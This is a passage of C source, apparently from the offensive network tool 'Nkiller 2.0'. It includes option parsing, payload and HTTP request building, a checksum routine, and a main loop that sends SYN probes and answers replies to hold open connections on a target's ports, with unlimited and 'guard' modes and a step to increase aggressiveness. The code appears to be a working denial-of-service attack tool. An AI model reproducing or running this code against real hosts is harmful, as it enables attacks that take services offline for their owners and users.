  current = Target->ports.last;
  current->next = newNode;
  Target->ports.last = newNode;
}



/* 
 * Return a random port from portlist
 */
static uint16_t
port_get_random(HostInfo *Target)
{
  port_elem *temp;
  unsigned int i, offset;

  temp = Target->ports.first;
  offset = (random() % Target->portlen);
  i = 0;
  while (i < offset) {
    temp = temp->next;
    i++;
  }
  return temp->port_val;
}



/*
 * Prepare the payload that will be sent in the 3rd phase
 * of the Connection-estalishment handshake (piggypacked
 * along with the ACK of the peer's SYNACK)
 */
static void
handle_payloads(HostInfo *Target)
{
  if (o.payload[0]) {
    Target->plen = strlen(o.payload);
    Target->payload = xmalloc(Target->plen);
    strncpy(Target->payload, o.payload, Target->plen);
  } else {
    Target->payload = NULL;
    Target->plen = 0;
  }

  if (o.path[0]) {
    if (o.vhost[0]) {
      Target->wlen = strlen(o.path) + strlen(o.vhost) +
        sizeof("GET  HTTP/1.0\015\012Host: \015\012\015\012") - 1;
      Target->url = xmalloc(Target->wlen + 1);
      /* + 1 for trailing '\0' of snprintf()  */
      snprintf(Target->url, Target->wlen + 1, 
          "GET %s HTTP/1.0\015\012Host: %s\015\012\015\012",
          o.path, o.vhost);
    } else {
      Target->wlen = strlen(o.path) + 
        sizeof("GET  HTTP/1.0\015\012\015\012") - 1;
      Target->url = xmalloc(Target->wlen + 1); 
      snprintf(Target->url, Target->wlen + 1, 
          "GET %s HTTP/1.0\015\012\015\012", o.path);
    }
  } else {
    Target->wlen = sizeof(WEB_PAYLOAD) - 1;
    Target->url = xmalloc(Target->wlen);
    memcpy(Target->url, WEB_PAYLOAD, Target->wlen);
  }
}



/* No way you have seen this before! */
static uint16_t
checksum_comp(uint16_t *addr, int len)
{
  register long sum = 0;
  uint16_t checksum;
  int count = len;
  uint16_t temp;

  while (count > 1)  {
    temp = *addr++;
    sum += temp;
    count -= 2;
  }
  if (count > 0)
    sum += *(char *) addr;

  while (sum >> 16)
    sum = (sum & 0xffff) + (sum >> 16);

  checksum = ~sum;
  return checksum;
}



int
main(int argc, char **argv)
{
  int print_help;
  int opt;
  int required;
  int debug_level;
  size_t i;
  unsigned int portlen;
  unsigned int probes, probes_sent, probes_left;
  unsigned int probes_this_rnd, probes_rnd_fini;
  int unlimited, state, probe_byusr;
  HostInfo *Target;
  SniffInfo *Sniffer;
  u_char *reply = NULL;
  char *endp; 

  srandom(time(0));

  if (argc == 1) {
    usage();
  }

  memset(&o, 0, sizeof(o));
  unlimited = 0;
  required = 0;
  portlen = 0;
  print_help = 0;
  probe_byusr = 0;

  probes = DEFAULT_NUM_PROBES;
  o.sleep = DEFAULT_SLEEP_TIME;
  o.probes_per_rnd = DEFAULT_PROBES_RND;
  o.probe_interval = DEFAULT_PROBE_INTERVAL;
  strncpy(o.skey, DEFAULT_KEY, sizeof(o.skey));
  o.polltime = DEFAULT_POLLTIME;

  /* Option parsing */
  while ((opt = getopt(argc, argv, "t:k:l:w:c:p:n:vd:s:r:N:T:P:yhg"))
      != -1)
  {
    switch (opt)
    {
      case 't':   /* target address */
        strncpy(o.target, optarg, sizeof(o.target));
        required++;
        break;
      case 'k':   /* secret key */
        strncpy(o.skey, optarg, sizeof(o.skey));
        break;
      case 'l':   /* payload */
        strncpy(o.payload, optarg, sizeof(o.payload) - 1);
        break;
      case 'w':  /* path */
        strncpy(o.path, optarg, sizeof(o.path) - 1);
        break;
      case 'r':    /* vhost name */
        strncpy(o.vhost, optarg, sizeof(o.vhost) -1);
        break;
      case 'c':   /* polltime */
        endp = NULL;
        o.polltime = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid polltime: %s\n", optarg);
        break;
      case 'p':   /* destination port */
        if (!(o.portlist = port_parse(optarg, &portlen))) 
          fatal("Couldn't parse ports!\n");
        required++;
        break;
      case 'n':   /* number of probes */
        endp = NULL;
        o.probes = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid probe number: %s\n", optarg);
        probe_byusr++;
        if (!o.probes) {
          unlimited++;
          probe_byusr = 0;
        }
        break;
      case 'N':    /* probes per round */
        endp = NULL;
        o.probes_per_rnd = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid probes-per-round number: %s\n", optarg);
        break;
      case 'T':    /* template number */
        endp = NULL;
        o.template = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid template number: %s\n", optarg);
        break;
      case 'P':    /* probe timer interval */
        endp = NULL;
        o.probe_interval = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid probe-interval number: %s\n", optarg);
        break;
      case 'g':  /* guard mode */
        o.guardmode++;
        break;
      case 'v':  /* verbose mode */
        o.verbose++;
        break;
      case 'd':  /* debug mode */
        endp = NULL;
        debug_level = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid probe number: %s\n", optarg);
        if (debug_level != 1 && debug_level != 2)
          fatal("Debug level must be either 1 or 2\n");
        else if (debug_level == 1)
          o.debug++;
        else {
          o.debug2++;
          o.debug++;
        }
        break;
      case 's':   /* sleep time between each probe */
        endp = NULL;
        o.sleep = strtoul(optarg, &endp, 0);
        if (errno != 0 || *endp != '\0')
          fatal("Invalid sleep number: %s\n", optarg);
        break;
      case 'y':   /* dynamic port handling */
        o.dynamic++;
        break;
      case 'h':   /* help - usage */
        print_help = 1;
        break;
      case '?':   /* error */
        usage();
        break;
    }
  }

  if (print_help) {
    help();
    exit(EXIT_SUCCESS);
  }

  if (getuid() && geteuid())
    fatal("You need to be root.\n");

  if (required < 2)
    fatal("You have to define both -t <target> and -p <portlist>\n");

  (void) fprintf(stdout, "\nStarting Nkiller 2.0 "
      "( http://sock-raw.org )\n");

  Target = xmalloc(sizeof(HostInfo));
  Sniffer = xmalloc(sizeof(SniffInfo));

  Target->portlen = portlen;
  for (i = 0; i < Target->portlen; i++)
    port_add(Target, o.portlist[i]);

  if (!unlimited && probe_byusr)
    probes = o.probes;

  inet_pton(AF_INET, o.target, &Target->daddr);

  handle_payloads(Target);
  sniffer_init(Target, Sniffer);

  if (o.verbose) {
    if (unlimited) 
      (void) fprintf(stdout, "Probes: unlimited\n");
    else 
      (void) fprintf(stdout, "Probes: %u\n", probes);
    (void) fprintf(stdout, 
        "Probes per round: %u\n"
        "Pcap polling time: %u microseconds\n"
        "Sleep time: %u microseconds\n"
        "Key: %s\n"
        "Probe interval: %u seconds\n"
        "Template: %s\n", o.probes_per_rnd, o.polltime,
        o.sleep, o.skey, o.probe_interval, get_template(o.template));
    if (o.guardmode)
      (void) fprintf(stdout, "Guardmode on\n");
  }

  probes_sent = 0;
  probes_left = probes;
  probes_rnd_fini = 0;
  probes_this_rnd = 0;

  /* Main loop */
  while (probes_left || o.guardmode || unlimited) {

    if (probes_rnd_fini >= o.probes_per_rnd) {
      probes_rnd_fini = 0;
      probes_this_rnd = 0;
    }

    if (!unlimited && probes_left == (0.5 * probes) && o.verbose)
      (void) fprintf(stdout, "Half of probes left.\n");

    if (probes_sent < probes && probes_this_rnd < o.probes_per_rnd) {
      send_syn_probe(Target, Sniffer);
      if (!unlimited)
        probes_sent++;
      probes_this_rnd++;
    }

    usleep(o.sleep);  /* Wait a bit before each probe */

    state = check_replies(Target, Sniffer, &reply);

    switch (state) 
    {
      case S_ERR: 
        continue;
        break;
      case S_SYNACK:
        send_probe(reply, Target, S_SYNACK);
        free(reply);
        break;
      case S_FDACK:
        continue;
        break;
      case S_PROBE:
        send_probe(reply, Target, S_PROBE);
        free(reply);
        probes_rnd_fini++;
        if (!unlimited)
          probes_left--;
        break;
      case S_DATA_0:
        send_probe(reply, Target, S_DATA_0);
        free(reply);
        if (o.template == T_BSDWIN)
          probes_rnd_fini++;
        break;
      case S_DATA_1:
        send_probe(reply, Target, S_DATA_1);
        free(reply);
        /* Increase aggressiveness */
        probes_rnd_fini++; 
        break;
      default:
        break;
    }

  }

  (void) fprintf(stdout, "Finished.\n");
  exit(EXIT_SUCCESS);
}


